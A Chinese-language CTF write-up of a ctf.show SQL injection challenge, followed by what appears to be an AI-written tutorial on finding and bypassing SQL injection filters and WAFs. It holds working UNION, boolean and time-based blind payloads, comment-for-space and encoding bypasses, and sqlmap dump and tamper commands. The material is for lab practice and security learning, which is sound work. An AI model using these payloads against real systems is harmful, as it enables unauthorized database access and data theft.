http://3aa4bf69-72f3-4d2f-ab48-68a2f03f09b9.challenge.ctf.show/index.php?id=2%27order%20by%202
访问后有文章，是正常的php，可尝试注入，但是空格有限制，简单绕过怕是不行
反思：不是每个SQL注入都需要'引号

1.启动靶机，进入首页，我们发现这是一个文章列表。点击一个，我们发现其url是带参数的。

2.既然是有参数的，我们就来用联合查询来注入，我们先判断一下回显，我们注入发现回显异常。

?id=1 order by 1
3.碰到这种情况大概率是因为某些字符被过滤了，我们把空格进行替换，发现回显正常。

`?id=1/**/order/**/by/**/1`

4.解决了这个问题，下面就简单了，我们先找出回显位数，逐一试发现位数为3，然后我们就判断一下回显位置，我们发现2回显了。

`?id=1/**/union/**/select/**/1,2,3#`
5.知道了回显位置之后，我们就可以查数据库名了，注入查得数据库名（web7）。

`?id=1/**/union/**/select/**/1,database(),3#`
6.得到数据库名后，我们就可以来查找表名了，注入发现报错无回显。

`?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='web7'),3#`

7.我们看看是不是还有什么被过滤了，我们将单引号进行替换，果然不出我们所料，查询到表名（flag）。

`?id=1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema="web7"),3#`
8.查询到表名之后查询列名，注入查询得到列名（flag）

`?id=1/**/union/**/select/**/1,(select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name="flag"),3#`
9.查询到列名之后，我们去查询列里面的值，也就是flag，注入得到flag

`?id=1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#`



可用sqlmap
python sqlmap.py -u "http://c03a36bc-3122-4b53-aebe-585fe0c7e526.challenge.ctf.show/index.php?id=1" --level=3 --batch --tamper="space2comment.py,versionedkeywords.py" -D web7 -T flag -C flag --dump



----




          
SQL 注入是一个复杂且多变的安全漏洞，排查和绕过限制需要系统性的方法和丰富的经验。下面我将为您详细介绍 SQL 注入一般需要注意哪些方面，以及如何一步步排查限制并进行绕过。

### 一、SQL 注入一般需要注意哪些？

在进行 SQL 注入测试时，有几个关键点需要您始终牢记：

1.  **目标识别与授权：**
    *   **识别注入点：** 不仅仅是 GET/POST 参数，还包括 HTTP Header (如 User-Agent, Referer, Cookie, X-Forwarded-For 等)、URL 路径、甚至文件上传等。任何用户可控并与数据库交互的地方都可能是注入点。
    *   **合法授权：** **务必确保您已获得明确的授权才能对目标系统进行测试。** 未经授权的测试是违法行为。

2.  **数据库类型：**
    *   不同的数据库管理系统 (DBMS) (如 MySQL, PostgreSQL, Microsoft SQL Server, Oracle) 有不同的 SQL 语法和特性。了解目标数据库类型有助于您构造更精确的 payload 和绕过技术。
    *   例如，MySQL 使用 `/* */` 作为多行注释，而 MSSQL 使用 `--` 作为单行注释。

3.  **注入类型：**
    *   **报错注入 (Error-based)：** 通过触发数据库错误来获取信息。
    *   **联合查询注入 (UNION-based)：** 通过 `UNION SELECT` 语句将查询结果合并到正常页面中。
    *   **布尔盲注 (Boolean-based blind)：** 根据页面返回的真假（例如页面内容变化或 HTTP 状态码）来判断条件是否成立，逐位获取数据。
    *   **时间盲注 (Time-based blind)：** 通过 `SLEEP()` 或 `WAITFOR DELAY` 等函数，根据页面响应时间来判断条件是否成立。
    *   **堆叠查询注入 (Stacked queries)：** 在某些数据库中，可以通过分号 `;` 堆叠多条 SQL 语句，执行额外的操作（如创建用户、删除表等），但通常无法直接回显结果。
    *   **带外注入 (Out-of-band, OOB)：** 利用数据库的某些功能（如 DNS 查询、HTTP 请求）将数据发送到攻击者控制的外部服务器，绕过页面回显限制。

4.  **防护机制：**
    *   **WAF (Web Application Firewall)：** 可能会拦截常见的注入 payload。
    *   **IDS/IPS (Intrusion Detection/Prevention System)：** 可能会检测并阻止异常流量。
    *   **输入过滤/转义：** 应用程序可能会对用户输入进行过滤或转义，例如将单引号 `'` 转换为 `''` 或 `\'`。

5.  **数据获取目标：**
    *   您想获取什么？数据库名、表名、列名、用户数据、密码哈希、文件内容，还是执行系统命令？明确目标有助于您选择合适的注入技术。

### 二、怎么开始一步步排查是什么限制？

排查限制是一个迭代的过程，需要耐心和细致。

#### 第一步：基础注入测试 (识别是否存在注入点及基本过滤)

1.  **测试单引号 `'`：**
    *   在参数值后面添加一个单引号，例如 `id=1'`。
    *   **观察：**
        *   如果页面报错，通常意味着存在注入点，并且数据库尝试解析了您的单引号，但没有正确闭合。
        *   如果页面正常，但内容发生变化，也可能存在注入。
        *   如果页面没有任何变化，可能是被过滤或没有注入。

2.  **测试逻辑判断：**
    *   `id=1 AND 1=1` (或 `id=1' AND '1'='1`)：页面正常显示。
    *   `id=1 AND 1=2` (或 `id=1' AND '1'='2`)：页面显示异常或无结果。
    *   **观察：** 如果 `1=1` 和 `1=2` 导致页面显示不同，说明 `AND` 关键字有效，且存在注入。

3.  **测试注释符：**
    *   `id=1' -- ` (MySQL/Oracle/PostgreSQL)
    *   `id=1' #` (MySQL)
    *   `id=1' /*` (MySQL/MSSQL/Oracle/PostgreSQL)
    *   **目的：** 闭合前面的单引号，并注释掉后面的 SQL 语句，使注入语句能够独立执行。
    *   **观察：** 如果页面恢复正常，说明注释符有效。

4.  **测试双引号 `"` 和括号 `)`：**
    *   如果单引号被过滤或转义，尝试双引号 `"`。
    *   尝试添加额外的括号 `))` 来闭合可能存在的括号。

#### 第二步：识别过滤关键字 (例如 `SELECT`, `UNION`, `OR` 等)

如果基础注入测试失败，或者某些关键字无法使用，说明可能存在关键字过滤。

1.  **尝试大小写混淆：**
    *   `id=1 AnD 1=2`
    *   `id=1 union select 1,2,3` -> `id=1 UnIoN SeLeCt 1,2,3`

2.  **尝试双写绕过：**
    *   `id=1 UNIunionON SELECT 1,2,3` (如果过滤器只移除一次关键字)

3.  **尝试编码绕过：**
    *   **URL 编码：** `SELECT` -> `%53%45%4C%45%43%54`
    *   **Hex 编码：** `SELECT` -> `0x53454C454354` (在某些数据库中，字符串可以用 Hex 表示)

4.  **尝试内联注释：**
    *   `id=1 UNI/**/ON SEL/**/ECT 1,2,3`

#### 第三步：识别空格过滤

如果 `AND` 或 `UNION` 等关键字无法与数字或列名之间使用空格，说明可能存在空格过滤。

1.  **尝试使用多行注释 `/**/` 替换空格：**
    *   `id=1/**/AND/**/1=2`
    *   `id=1/**/UNION/**/SELECT/**/1,2,3`

2.  **尝试使用 URL 编码的空格 `+` 或 `%20`：**
    *   `id=1+AND+1=2`
    *   `id=1%20UNION%20SELECT%201,2,3`

3.  **尝试使用其他空白字符的 URL 编码：**
    *   `%0a` (换行符), `%0b` (垂直制表符), `%0c` (换页符), `%0d` (回车符)
    *   `id=1%0aAND%0a1=2`

#### 第四步：识别 WAF/IDS

如果上述方法都失败，或者请求被直接拦截，很可能存在 WAF。

1.  **使用 sqlmap 的 `--check-waf` 选项：**
    ```bash
    sqlmap -u "http://example.com/vulnerable?id=1" --check-waf
    ```
    sqlmap 会尝试识别常见的 WAF 产品。

2.  **观察 HTTP 响应：**
    *   **状态码：** 403 Forbidden, 500 Internal Server Error 等。
    *   **错误页面：** WAF 通常会有特定的拦截页面或错误提示。
    *   **响应头：** 可能会包含 WAF 的名称或版本信息 (如 `Server: cloudflare-nginx`)。

3.  **尝试延时注入：**
    *   如果 WAF 拦截了所有 payload，但没有立即返回错误，可以尝试时间盲注，观察响应时间是否符合预期。WAF 可能会在一定时间内放行请求，但如果请求包含恶意 payload，则会延迟响应或拦截。

### 三、怎么绕过进行注入呢？

针对不同的限制，有不同的绕过技术。

#### 1. 绕过空格过滤

*   **`/**/` (多行注释)：** 最常用且有效的绕过方式，将空格替换为 `/**/`。
*   **`%0a`, `%0b`, `%0c`, `%0d` (换行符、制表符等)：** 这些 URL 编码的空白字符在某些情况下可以替代空格。
*   **`+` (URL 编码的空格)：** 在 GET 请求中，`+` 通常会被服务器解析为空格。
*   **括号 `()`：** 在某些 SQL 语法中，可以使用括号来分隔关键字和表达式，从而避免使用空格。例如 `UNION(SELECT(1),2,3)`。
*   **sqlmap tamper 脚本：**
    *   `space2comment.py`：将空格替换为 `/**/`。
    *   `space2plus.py`：将空格替换为 `+`。
    *   `space2mysqlblank.py`：将空格替换为 MySQL 特有的空白字符。
    *   `space2mssqlblank.py`：将空格替换为 MSSQL 特有的空白字符。

#### 2. 绕过关键字过滤

*   **大小写混淆：** `SELECT` -> `sElEcT`。
*   **双写绕过：** `UNION` -> `UNIunionON`。
*   **编码绕过：**
    *   **URL 编码：** `SELECT` -> `%53%45%4C%45%43%54`。
    *   **Hex 编码：** `SELECT` -> `0x53454C454354` (在 MySQL 中，字符串可以用 `0x` 开头的 Hex 值表示)。
*   **内联注释：** `SEL/**/ECT`。
*   **等价函数/语句：**
    *   `concat()` 替代 `+` 连接字符串。
    *   `substr()` 替代 `substring()`。
    *   `IF()` 替代 `CASE WHEN`。
*   **特殊字符：** 在 MySQL 中，可以使用 `!` 来分隔关键字，例如 `SELECT!1`。
*   **sqlmap tamper 脚本：**
    *   `charencode.py`：对所有字符进行 URL 编码。
    *   `randomcase.py`：随机大小写。
    *   `unionalltounion.py`：将 `UNION ALL SELECT` 替换为 `UNION SELECT` (如果 `ALL` 被过滤)。
    *   `apostrophemask.py`：将单引号替换为 UTF-8 编码的单引号。

#### 3. 绕过引号过滤

*   **Hex 编码：** 将字符串转换为 Hex 编码，例如 `'admin'` -> `0x61646D696E`。
*   **宽字节注入：** 针对使用 GBK 等多字节字符集的应用程序，通过在单引号前添加一个 `\` 字符，使其与前一个字节组成一个合法的宽字节字符，从而绕过转义。
*   **sqlmap tamper 脚本：**
    *   `apostrophemask.py`：将单引号替换为 UTF-8 编码的单引号。
    *   `modsecurityversioned.py`：在单引号前添加 `/*!00000*/` 注释，绕过 ModSecurity WAF。

#### 4. 绕过 WAF/IDS

WAF 绕过是 SQL 注入中最具挑战性的部分，通常需要结合多种技术。

*   **HTTP 参数污染 (HPP)：** 将一个参数拆分成多个，例如 `?id=1&id=UNION SELECT`，WAF 可能只检查第一个 `id` 参数。
*   **HTTP 方法篡改：** 尝试将 GET 请求改为 POST 请求，或反之，有时 WAF 对不同方法的检查力度不同。
*   **请求头注入：** 如果 WAF 主要关注 URL 和 POST 数据，可以尝试在 User-Agent, Referer, Cookie 等 HTTP 头中进行注入。
*   **延时注入：** 利用 WAF 的检测机制，通过时间盲注来避免被立即拦截。
*   **分块传输编码 (Chunked encoding)：** 将 HTTP 请求体分成多个小块传输，WAF 可能无法完整解析请求体，从而绕过检测。
*   **自定义 tamper 脚本：** 针对特定的 WAF 产品，编写专门的 tamper 脚本。
*   **sqlmap tamper 脚本：** sqlmap 提供了大量针对不同 WAF 的 tamper 脚本，例如 `modsecurityzeroversioned.py`, `cloudflare.py`, `percentsign.py` 等。

#### 5. 绕过错误信息屏蔽 (盲注技术)

如果页面不显示任何错误信息，也无法通过联合查询获取数据，就需要使用盲注。

*   **布尔盲注：**
    *   **原理：** 构造条件语句，根据页面返回的真假（例如页面内容是否变化、HTTP 状态码是否变化）来判断条件是否成立。
    *   **Payload 示例：** `AND SUBSTRING((SELECT database()),1,1)='a'`
    *   **优点：** 适用于大多数情况。
    *   **缺点：** 效率较低，需要大量请求。

*   **时间盲注：**
    *   **原理：** 构造条件语句，如果条件成立则执行一个延时函数（如 `SLEEP(5)`），根据页面响应时间来判断条件是否成立。
    *   **Payload 示例：** `AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)`
    *   **优点：** 适用于页面无任何回显的情况。
    *   **缺点：** 效率极低，容易被 WAF 识别。

*   **带外注入 (OOB)：**
    *   **原理：** 利用数据库的某些功能（如 MySQL 的 `LOAD_FILE()` 结合 UNC 路径，或 Oracle 的 `UTL_HTTP` 包）将数据发送到攻击者控制的外部服务器（如 DNS 服务器或 HTTP 服务器）。
    *   **优点：** 绕过页面回显限制，效率相对较高。
    *   **缺点：** 依赖于数据库的特定功能和网络环境。

### 四、使用 sqlmap 自动化排查和绕过

sqlmap 是一个强大的自动化工具，可以帮助您高效地进行 SQL 注入测试。

1.  **基础扫描：**
    ```bash
    sqlmap -u "http://example.com/vulnerable?id=1" --batch --dbs -v 3
    ```
    *   `-u`：指定目标 URL。
    *   `--batch`：自动选择默认选项。
    *   `--dbs`：尝试列出数据库。
    *   `-v 3`：显示详细的请求和响应信息，有助于排查问题。

2.  **指定注入点：**
    ```bash
    sqlmap -u "http://example.com/vulnerable?id=1*" --batch --dbs
    ```
    在参数后添加 `*` 明确告诉 sqlmap 注入点。

3.  **使用 `--tamper` 选项：**
    *   根据您排查到的限制，选择合适的 tamper 脚本。
    *   **单个 tamper：**
        ```bash
        sqlmap -u "http://example.com/vulnerable?id=1" --tamper="space2comment.py" --batch --dbs
        ```
    *   **多个 tamper 组合：** 用逗号 `,` 分隔。
        ```bash
        sqlmap -u "http://example.com/vulnerable?id=1" --tamper="space2comment.py,charencode.py" --batch --dbs
        ```
        **注意：** tamper 脚本的顺序很重要，它们会按照指定的顺序依次处理 payload。

4.  **检查 WAF：**
    ```bash
    sqlmap -u "http://example.com/vulnerable?id=1" --check-waf
    ```

5.  **更高级的选项：**
    *   `--risk` 和 `--level`：调整扫描的深度和风险。
    *   `--technique`：指定注入技术 (B: 布尔盲注, T: 时间盲注, E: 报错注入, U: 联合查询注入, S: 堆叠查询, Q: 带外注入)。
    *   `--proxy`：使用代理进行扫描。
    *   `--random-agent`：使用随机 User-Agent。

**总结：**

SQL 注入的排查和绕过是一个不断尝试和验证的过程。从最简单的测试开始，逐步增加复杂性，并根据服务器的响应来调整您的策略。sqlmap 是一个强大的辅助工具，但理解其背后的原理和各种绕过技术，才能在面对复杂场景时游刃有余。**再次强调，请务必在获得合法授权的情况下进行任何安全测试。**
        